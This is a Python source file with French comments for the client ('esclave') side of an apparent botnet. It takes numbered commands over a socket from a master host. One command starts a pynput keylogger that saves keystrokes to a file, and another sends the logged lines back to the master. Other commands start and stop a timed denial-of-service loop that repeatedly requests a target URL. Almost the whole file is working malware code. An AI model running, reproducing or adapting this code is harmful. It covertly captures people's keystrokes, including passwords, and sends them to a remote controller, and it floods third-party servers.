
# Imports et installation des paquets requis ---------------------------------------------------------------------------
import os
import re
import socket
from datetime import datetime, time
import configparser
try:
    os.system("pip install requests")
except DeprecationWarning():
    pass
import requests
from pynput.keyboard import Listener
import threading
try:
    os.system("pip install pynput")
except DeprecationWarning():
    pass


# Création de l'objet esclave ------------------------------------------------------------------------------------------
class Slave:
    # Initialisation de l'objet ----------------------------------------------------------------------------------------
    def __init__(self, ip : str, port: int, addr_master: tuple):
        self.ip = ip
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listen_state = False
        self.keylog_state = False
        self.ddos_state = False
        self.addr_master = addr_master
        self.t1 = threading.Thread(target=self.listen)

    # Tentative de connection au maître --------------------------------------------------------------------------------
    def listen(self):
        try:
            self.socket.bind((self.ip, self.port))
            self.socket.listen()
            message =(f"{self.ip}:{self.port}")
            self.temp_socket(message)
        except socket.error:
            print("Erreur, tentative de reconnection")
            self.listen()
        print("Le socket est bind, Prêt à accepter des connections!")
        self.listen_state = True
        while self.listen_state:
            try:
                conn, addr = self.socket.accept()
                print(f"Co Acceptée de {addr}")
                message = conn.recv(1024).decode()
                decode_msg(message)
            except socket.error:
                print("Erreur lors de la connection du slave")

    # Appel de la fonction de démarrage du logging ---------------------------------------------------------------------
    def start_log(self):
        self.keylog_state = True
        thread_keylogger = threading.Thread(target=keylogger, args=(self.keylog_state,))
        thread_keylogger.start()

    # Appel de la fonction d'arrêt du logging --------------------------------------------------------------------------
    def stop_log(self):
        if self.keylog_state:
            self.keylog_state = False
            message ="Keylogger arrêté"
            self.temp_socket(message)
        else:
            message = "Le keylogger n'était pas activé"
            self.temp_socket(message)

    # Appel de la fonction de transfer de logs vers le maître ----------------------------------------------------------
    def get_log(self, lines):
        get_log(self.addr_master, lines)

    # Début de l'attaque ddos locale -----------------------------------------------------------------------------------
    def start_ddos(self, url, heure):
        self.ddos_state = True
        thread_ddos = threading.Thread(target=self.ddos, args=(url, heure,))
        thread_ddos.start()

    # Arrêt de l'attaque ddos locale -----------------------------------------------------------------------------------
    def stop_ddos(self):
        if self.ddos_state:
            self.ddos_state = False
            message ="Arrêt du DDOS"
            self.temp_socket(message)
        else:
            message = "Le DDOS n'était pas activé"
            self.temp_socket(message)

    # Attaque déni de service sur une machine externe (attaque par url) ------------------------------------------------
    def ddos(self, url, heure_attaque):
        heure = datetime.strptime(heure_attaque, "%H:%M:%S").time()
        while self.ddos_state:
            now = datetime.now().time()
            if heure < now:
                r = requests.get(url)

    # Création d'un socket temporaire pour envoyer un message au Master ------------------------------------------------
    def temp_socket(self, message):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(self.addr_master)
            s.sendall(message.encode())
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            print("Erreur lors de l'envoi du message vers le master!")

# Décodage du message reçu du maître et interprétation de l'ordre à exécuter  ------------------------------------------
def decode_msg(message):
    conditions = [
        message in ["1", "2", "5"],
        bool(re.search("3-[0-9]{1,100}", message)),
        bool(re.search("4-.*-[0-9]{2}:[0-9]{2}:[0-9]{2}", message))
    ]
    if not any(conditions):
        print(message)
        print(type(message))
    else:
        if conditions[0]:
            if message == "1":
                slave.start_log()
            if message == "2":
                slave.stop_log()
            if message == "5":
                slave.stop_ddos()
        if conditions[1]:
            lines = message.split("-")
            slave.get_log(lines[1])
        if conditions[2]:
            temp = message.split("-")
            slave.start_ddos(temp[1], temp[2])


keys = []
count = 0


#  Définition du programme de Keylogger --------------------------------------------------------------------------------
def keylogger(flag: bool):
    def on_press(key):
        global keys, count
        if flag:
            count += 1
            keys.append(key)
            if count >= 20:
                count = 0
                write_file(keys)
                keys = []
        else:
            write_file(keys)
            return False
    # Ecriture des caractères chargés de la liste dans le fichier log --------------------------------------------------
    def write_file(liste):
        with open("log.txt", 'a') as f:
            for key in liste:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('  ')
                elif k.find("enter") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

        f.close()
    with Listener(on_press=on_press) as listener:
        listener.join()

# Transfert des logs des esclaves vers les maîtres ---------------------------------------------------------------------
def get_log(master_ad, lines):
    lines = int(lines)
    try:
        f = open("log.txt", "r")
        log = f.readlines()
        f.close()
        if lines >= len(log):
            lines = len(log) - 1
        content = log[-1:-lines - 1:-1]
        try:
            alter_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            alter_socket.connect(master_ad)
            for elem in content:
                print(elem)
                alter_socket.send(("3:" + elem).encode())
            alter_socket.shutdown(socket.SHUT_RDWR)
            alter_socket.close()
        except socket.error:
            print("Erreur lors de l'envoi des logs!")
    except FileNotFoundError:
        print("Le fichier est introuvable !")

########################################################################################################################
#Le fichier de config doit être un fichier txt sous le nom de Param_Slave. Celui-ci doit se trouver a la même racine que le programme Slave.py#
config = configparser.ConfigParser()
config.read("Param_slave")
ip = str(config.get("Slave", "slave_ip"))
port = int(config.get("Slave", "slave_port"))
ip_master = str(config.get("Slave", "master_ip"))
port_master = int(config.get("Slave", "master_port"))
ad_master = (ip_master,port_master)
slave = Slave(ip, port, ad_master)
slave.t1.start()
